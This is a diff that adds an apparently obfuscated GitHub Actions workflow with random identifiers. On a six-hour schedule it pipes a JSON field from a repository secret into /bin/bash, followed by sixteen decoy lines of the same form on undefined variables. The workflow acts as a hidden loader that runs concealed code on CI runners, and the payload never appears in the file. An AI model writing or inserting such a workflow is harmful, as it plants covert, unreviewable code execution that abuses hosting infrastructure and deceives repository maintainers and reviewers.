@@ -1,0 +1,34 @@
+name: conjixuj
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: conjixuj
+        env:
+          pwfkg19198: ${{ secrets.pwfkg19198 }}
+        run: |
+          echo $pwfkg19198 | jq -r .ukqms21 | /bin/bash
+          echo $j5343 | jq -r .zf02 | /bin/bash
+          echo $ipx43 | jq -r .k83554 | /bin/bash
+          echo $lkin56458 | jq -r .zfhbd753 | /bin/bash
+          echo $ho69 | jq -r .q3 | /bin/bash
+          echo $uqls6 | jq -r .b70 | /bin/bash
+          echo $sxup89289 | jq -r .tdgkq5 | /bin/bash
+          echo $kyd9 | jq -r .yhg18 | /bin/bash
+          echo $zgycl2036 | jq -r .nun9 | /bin/bash
+          echo $hk4 | jq -r .onlv9720 | /bin/bash
+          echo $lufv6 | jq -r .f43 | /bin/bash
+          echo $kdzk80378 | jq -r .cwudp32143 | /bin/bash
+          echo $djrb4 | jq -r .uex30644 | /bin/bash
+          echo $qcoz004 | jq -r .v39710 | /bin/bash
+          echo $jh8495 | jq -r .ti5150 | /bin/bash
+          echo $ppy09240 | jq -r .zxlwl551 | /bin/bash
+          echo $m69 | jq -r .xruvp17 | /bin/bash
+
